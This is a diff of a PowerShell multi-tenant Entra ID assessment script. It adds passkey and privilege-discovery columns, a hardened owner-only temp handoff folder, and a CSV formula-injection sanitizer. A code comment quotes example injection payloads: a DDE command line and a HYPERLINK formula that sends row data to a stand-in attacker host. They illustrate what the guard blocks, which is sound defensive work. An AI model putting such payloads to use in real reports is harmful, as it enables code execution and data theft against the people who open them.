@@ -90,9 +90,11 @@
         -ThrottleLimit 6 -Resume
 
 .NOTES
-    App-only runs require the four Graph permissions granted as APPLICATION permissions
+    App-only runs require the six Graph permissions granted as APPLICATION permissions
     with admin consent in each tenant: Policy.Read.All, AuditLog.Read.All, User.Read.All,
-    GroupMember.Read.All.
+    GroupMember.Read.All, RoleManagement.Read.Directory,
+    PrivilegedEligibilitySchedule.Read.AzureADGroup. Without the last two, every tenant's
+    privileged-account discovery is incomplete and its targeting exports are withheld.
 
     The cross-tenant summary CSV names customers and counts their weakest accounts.
     Treat it with the same handling as the per-tenant exports. See SECURITY.md.
@@ -296,6 +298,124 @@ end {
         }
     }
 
+    function New-PrivateHandoffDirectory {
+        # The concurrent sweep's handoff folder: each child's splatted parameters (tenant,
+        # app registration, certificate thumbprint, output path) and its summary pass through
+        # it. It sits in the temp directory, which on Linux and macOS every local account can
+        # write to.
+        #
+        # The folder used to be named from the clock (EntraSweep_<yyyyMMdd_HHmmss>) and made
+        # with New-Item -Force, which accepts a folder or a symlink that is already there, and
+        # a failure to restrict it was only a warning. Another local account could plant that
+        # name first, read the parameters, or swap them before the child read them. Now:
+        #
+        #   - the name carries a random GUID, so it cannot be planted in advance;
+        #   - anything already at that path, a link included, is refused;
+        #   - on Linux and macOS it is created 0700 in the same call, and on
+        #     Windows it is restricted to the owner and Administrators before it is returned;
+        #   - the result is checked, and a folder that is not private is removed and the
+        #     sweep stops, before a single parameter is written into it.
+        #
+        # -SkipAclHardening skips the restriction and the check, as everywhere else.
+        param(
+            [Parameter(Mandatory)][string]$Parent,
+            # Injected only by tests, to point at a path they have already occupied.
+            [string]$Name = ('EntraSweep_' + [guid]::NewGuid().ToString('n')),
+            [switch]$SkipAclHardening
+        )
+
+        $path = Join-Path $Parent $Name
+        # Get-Item -Force sees a dangling link too, which Test-Path does not.
+        if (Get-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue) {
+            throw "Refusing to use $path for the sweep handoff: something already exists there."
+        }
+
+        # On Linux and macOS the folder is created 0700 in the same call, including under
+        # -SkipAclHardening: that switch exists for report folders on filesystems that refuse
+        # permission changes, not for a folder in the shared temp directory that says which
+        # tenant each child reads.
+        if (-not $IsWindows) {
+            [void][System.IO.Directory]::CreateDirectory($path, [System.IO.UnixFileMode]448)
+        }
+        else {
+            # No -Force: an existing folder is an error, never adopted.
+            New-Item -ItemType Directory -Path $path -ErrorAction Stop | Out-Null
+        }
+
+        try {
+            $item = Get-Item -LiteralPath $path -Force
+            if ($item.LinkType -or ($item.Attributes -band [System.IO.FileAttributes]::ReparsePoint)) {
+                throw "$path is a link, not a folder this sweep created."
+            }
+            if (-not $SkipAclHardening) {
+                Protect-OutputFile -Path $path -Directory
+                $private = if ($IsWindows) {
+                    $acl = Get-Acl -LiteralPath $path
+                    $allowed = @(
+                        [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+                        'S-1-5-32-544'
+                    )
+                    $rules = @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier]))
+                    $acl.AreAccessRulesProtected -and $rules.Count -gt 0 -and
+                        @($rules | Where-Object { $_.IdentityReference.Value -notin $allowed }).Count -eq 0
+                }
+                else {
+                    [int]([System.IO.DirectoryInfo]::new($path).UnixFileMode) -eq 448
+                }
+                if (-not $private) {
+                    throw "Could not make $path private to this account, so nothing was written into it."
+                }
+            }
+        }
+        catch {
+            Remove-Item -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue
+            throw
+        }
+
+        return $path
+    }
+
+    function Protect-CsvInjection {
+        # CSV/formula injection. A display name of "=cmd|'/c calc'!A1" or
+        # "=HYPERLINK(""http://attacker/""&A1,""Click"")" executes when the report is opened in
+        # Excel, exfiltrating the row it sits next to. Display names are attacker-influenceable
+        # in tenants that allow self-service profile edits or B2B invites, and this report is
+        # specifically a file that a manager will open in Excel. Prefixing the value with a
+        # single quote makes Excel treat it as literal text.
+        #
+        # The trigger is looked for past any leading whitespace or control characters, and in
+        # its full-width forms (U+FF1D, U+FF0B, U+FF0D, U+FF20) as well. That part is
+        # precautionary: LibreOffice 24.2 was observed to evaluate only an unpadded "=", and
+        # Excel's handling of padded or full-width triggers has not been verified. A value is
+        # only ever prefixed, never altered, so nothing a reader needs is lost.
+        #
+        # Applied at export time only, so in-memory objects stay pristine for the HTML path,
+        # which has its own encoding. Identical copies live in the sweep and the comparison
+        # script; tests/Sanitization.Tests.ps1 keeps them identical.
+        param([Parameter(ValueFromPipeline)][object]$InputObject)
+
+        process {
+            $triggers = @('=', '+', '-', '@', [char]0xFF1D, [char]0xFF0B, [char]0xFF0D, [char]0xFF20)
+            $clone = [ordered]@{}
+            foreach ($property in $InputObject.PSObject.Properties) {
+                $value = $property.Value
+                if ($value -is [string] -and $value.Length -gt 0) {
+                    $lead = $null
+                    foreach ($character in $value.ToCharArray()) {
+                        if (-not ([char]::IsWhiteSpace($character) -or [char]::IsControl($character))) { $lead = $character; break }
+                    }
+                    $startsHidden = [char]::IsWhiteSpace($value[0]) -or [char]::IsControl($value[0])
+                    if ($value[0] -in $triggers -or $value[0] -in @([char]9, [char]10, [char]13) -or
+                        ($startsHidden -and $null -ne $lead -and $lead -in $triggers)) {
+                        $value = "'" + $value
+                    }
+                }
+                $clone[$property.Name] = $value
+            }
+            [PSCustomObject]$clone
+        }
+    }
+
     function New-SweepResultRow {
         # One shape for every result, so the sequential path, the parallel path, and the
         # failure path cannot drift into producing different columns.
@@ -343,6 +463,28 @@ end {
             BlockedAtRetirement        = & $get 'BlockedAtRetirement'
             BlockedAdminsAtRetirement  = & $get 'BlockedAdminsAtRetirement'
             PasswordlessCapableInScope = & $get 'PasswordlessCapableInScope'
+            # Passkey adoption per tenant. Counted over every enabled user by the
+            # assessment, not over its migration candidates, so the column compares
+            # tenant to tenant without needing their candidate counts to match.
+            UsersWithPasskey           = & $get 'UsersWithPasskey'
+            UsersWithoutPasskey        = & $get 'UsersWithoutPasskey'
+            # How many users that tenant's campaign would target. Narrower than
+            # UsersWithoutPasskey, which counts everyone without one: this counts only
+            # those who also hold a retiring phone method, so it sizes the actual work.
+            # The per-tenant file itself sits beside that tenant's ReportPath, which is
+            # already a column, so the path is not duplicated here.
+            CampaignCandidates         = & $get 'CampaignCandidates'
+            # The wider rollout figure, and the two omitted counts, which differ: a
+            # privileged user with no phone method is held back from the no-passkey list
+            # and was never a candidate for the campaign list.
+            NoPasskeyNonprivileged     = & $get 'NoPasskeyNonprivileged'
+            NoPasskeyPrivilegedOmitted = & $get 'NoPasskeyPrivilegedOmitted'
+            CampaignPrivilegedOmitted  = & $get 'CampaignPrivilegedOmitted'
+            # Whether the two counts above can be trusted at all. A tenant whose role reads
+            # failed publishes no targeting list, and its campaign columns read blank rather
+            # than 0 -- so this column is what tells an estate reader which it is.
+            PrivilegeDiscoveryComplete = & $get 'PrivilegeDiscoveryComplete'
+            PrivilegeDiscoveryGaps     = & $get 'PrivilegeDiscoveryGaps'
             OldestReportRowUtc         = & $get 'OldestReportRowUtc'
             # When this tenant was actually assessed, which is not the same as when the
             # summary file was written. -Resume copies a successful row forward verbatim
@@ -483,18 +625,10 @@ end {
         # every local account can read it for as long as the sweep runs. What it holds is
         # not user rows, but it does name every customer being assessed, where their
         # evidence is being written, and which app registration is reading their tenant.
-        # Lock it to the owner before anything is written into it -- the files inside
-        # inherit that, and the directory is removed in the finally below either way.
-        #
-        # The name must be unguessable and the directory must be new. It used to be named
-        # from the start time to the second, and an existing directory of that name was
-        # reused: a local user who pre-created the next few minutes of names received every
-        # child's parameter file, and could swap it for one pointing the operator's
-        # certificate at any consented tenant before the child read it.
-        # CreateTempSubdirectory is mkdtemp on Linux and macOS: random name, created
-        # atomically, 0700 from the first instant.
-        $handoffRoot = [System.IO.Directory]::CreateTempSubdirectory('EntraSweep_').FullName
-        if (-not $SkipAclHardening) { Protect-OutputFile -Path $handoffRoot -Directory }
+        # New-PrivateHandoffDirectory gives it an unguessable name, refuses anything already
+        # there, and returns only once it is verifiably owner-only, so nothing is written
+        # into it before then. It is removed in the finally below either way.
+        $handoffRoot = New-PrivateHandoffDirectory -Parent ([System.IO.Path]::GetTempPath()) -SkipAclHardening:$SkipAclHardening
 
         $rowFunction = ${function:New-SweepResultRow}.ToString()
         $assessmentPath = (Resolve-Path -LiteralPath $AssessmentScriptPath).Path
@@ -519,7 +653,12 @@ end {
                     # Paths are embedded in the child command, so any apostrophe in an
                     # operator-supplied -ReportRoot must be doubled or it terminates the
                     # string early.
-                    $q = { param($p) "'" + ($p -replace "'", "''") + "'" }
+                    #
+                    # Escaped by PowerShell's own routine rather than by doubling the ASCII
+                    # apostrophe alone: PowerShell also ends a single-quoted string at the
+                    # typographic quotes U+2018 to U+201B, so a folder named with a curly
+                    # apostrophe -- what Word and many keyboards type -- broke the command.
+                    $q = { param($p) "'" + [System.Management.Automation.Language.CodeGeneration]::EscapeSingleQuotedStringContent($p) + "'" }
 
                     $childCommand = @"
 `$ErrorActionPreference = 'Stop'
@@ -622,20 +761,18 @@ end {
         'Customer', 'TenantId', 'Status', 'AssessmentConfidence', 'RegistrationCampaignState',
         'PolicyMigrationState', 'SmsPolicyState', 'VoicePolicyState', 'EnabledUsersAssessed',
         'MigrationCandidates', 'Critical', 'High', 'Moderate', 'Low', 'BlockedAtRetirement',
-        'BlockedAdminsAtRetirement', 'PasswordlessCapableInScope', 'OldestReportRowUtc',
+        'BlockedAdminsAtRetirement', 'PasswordlessCapableInScope',
+        'UsersWithPasskey', 'UsersWithoutPasskey', 'NoPasskeyNonprivileged',
+        'CampaignCandidates', 'NoPasskeyPrivilegedOmitted', 'CampaignPrivilegedOmitted',
+        'PrivilegeDiscoveryComplete', 'PrivilegeDiscoveryGaps', 'OldestReportRowUtc',
         'AssessmentTimeUtc', 'ReportPath', 'Error'
     )
 
     # Same injection guard as the per-tenant exports: customer labels reach this file too.
     $guarded = foreach ($row in $sorted) {
         $clone = [ordered]@{}
-        foreach ($name in $columns) {
-            $value = & $readColumn $row $name
-            if ($value -is [string] -and $value.Length -gt 0 -and
-                $value[0] -in @('=', '+', '-', '@', [char]9, [char]13)) { $value = "'" + $value }
-            $clone[$name] = $value
-        }
-        [PSCustomObject]$clone
+        foreach ($name in $columns) { $clone[$name] = & $readColumn $row $name }
+        [PSCustomObject]$clone | Protect-CsvInjection
     }
     $guarded | Export-Csv -LiteralPath $summaryPath -NoTypeInformation -Encoding utf8BOM
 
